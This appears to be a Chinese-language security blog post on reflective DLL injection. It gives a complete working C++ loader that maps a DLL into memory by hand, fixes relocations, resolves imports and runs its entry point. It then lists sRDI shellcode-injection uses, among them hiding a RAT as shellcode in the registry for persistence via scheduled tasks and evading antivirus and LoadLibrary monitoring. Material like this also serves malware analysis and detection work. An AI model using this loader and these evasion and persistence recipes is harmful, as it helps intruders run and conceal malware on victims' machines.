---
layout: post
title: Reflective Inject
categories: Inject
description: Inject 之 反射注入
keywords: Windows，注入，免杀

---

反射注入技术

# Reflective Inject

## 1.DLL 注入

### 原理

- Execution is passed, either via CreateRemoteThread() or a tiny bootstrap shellcode, to the library's ReflectiveLoader function which is an exported function found in the library's export table.
- As the library's image will currently exists in an arbitrary location in memory the ReflectiveLoader will first calculate its own image's current location in memory so as to be able to parse its own headers for use later on.
- The ReflectiveLoader will then parse the host processes kernel32.dll export table in order to calculate the addresses of three functions required by the loader, namely LoadLibraryA, GetProcAddress and VirtualAlloc.
- The ReflectiveLoader will now allocate a continuous region of memory into which it will proceed to load its own image. The location is not important as the loader will correctly relocate the image later on.
- The library's headers and sections are loaded into their new locations in memory.
- The ReflectiveLoader will then process the newly loaded copy of its image's import table, loading any additional library's and resolving their respective imported function addresses.
- The ReflectiveLoader will then process the newly loaded copy of its image's relocation table.
- The ReflectiveLoader will then call its newly loaded image's entry point function, DllMain with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
- Finally the ReflectiveLoader will return execution to the initial bootstrap shellcode which called it, or if it was called via CreateRemoteThread, the thread will terminate.

### 工作流程

1. 将原始 DLL 字节读入内存缓冲区
2. 解析 DLL 头并获取 SizeOfImage
3. 分配新的内存空间 SizeOfImage
4. 将 DLL 头和区段表复制到步骤 3 中分配的内存空间
5. 修复重定位
6. 加载 DLL 导入的库
7. 解析导入表
8. 调用 DLL

### 完整代码

```c++
#include <Windows.h>

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main()
{
	// 获取模块基址
	PVOID imageBase = GetModuleHandleA(NULL);

	// 将 DLL 加载到堆空间中
	HANDLE dll = CreateFileA("\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD64 dllSize = GetFileSize(dll, NULL);
	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD outSize = 0;
	ReadFile(dll, dllBytes, dllSize, &outSize, NULL);

	// 获取指向内存中 DLL 头的指针
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	// 为 DLL 分配新的内存空间
	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 获取下一个模块位置
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// 将 DLL 头复制到为 DLL 新分配的空间中
	std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// 将 DLL 区段表复制到为 DLL 新分配的空间
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	// 修复重定位
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
			{
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	// 解析导入表
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					// IOT 表
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					// IAT 表
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		importDescriptor++;
	}

	// 执行加载的 DLL
	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

	CloseHandle(dll);
	HeapFree(GetProcessHeap(), 0, dllBytes);

	return 0;
}
```

参考链接：[反射 DLL 注入](https://github.com/stephenfewer/ReflectiveDLLInjection)

## 2.Shellcode 注入

### 用例 #1 – 隐秘的持久性

- 使用服务器端 Python 代码 (sRDI) 将 RAT 转换为 shellcode
- 将 shellcode 写入注册表
- 设置计划任务以执行基本加载程序 DLL
- Loader 读取 shellcode 并注入（<20 行 C 代码）
- 优点： 您的 RAT 或加载程序都不需要了解 RDI 或使用 RDI 进行编译。装载机可以保持小而简单以避免 AV。

### 用例 #2 – 侧载

- 让 RAT 在内存中运行
- 编写 DLL 以执行额外的功能
- 将 DLL 转换为 shellcode（使用 sRDI）并在本地注入
- 使用 GetProcAddressR 查找导出的函数
- 在不重新加载 DLL 的情况下多次执行附加功能
- 优点： 让您的初始工具更加轻量，并根据需要添加功能。加载一次 DLL 并像使用其他任何内容一样使用它。

### 用例 #3 – 依赖项

- 从磁盘读取现有的合法 API DLL
- 将 DLL 转换为 shellcode（使用 sRDI）并将其加载到内存中
- 使用 GetProcAddress 查找所需的函数
- 优点： 避免使用检测 LoadLibrary 调用的监控工具。在不泄露信息的情况下访问 API 函数。（WinInet、PSAPI、TlHelp32、GdiPlus）

参考链接：[反射 DLL 注入的 Shellcode 实现](https://github.com/monoxgas/sRDI)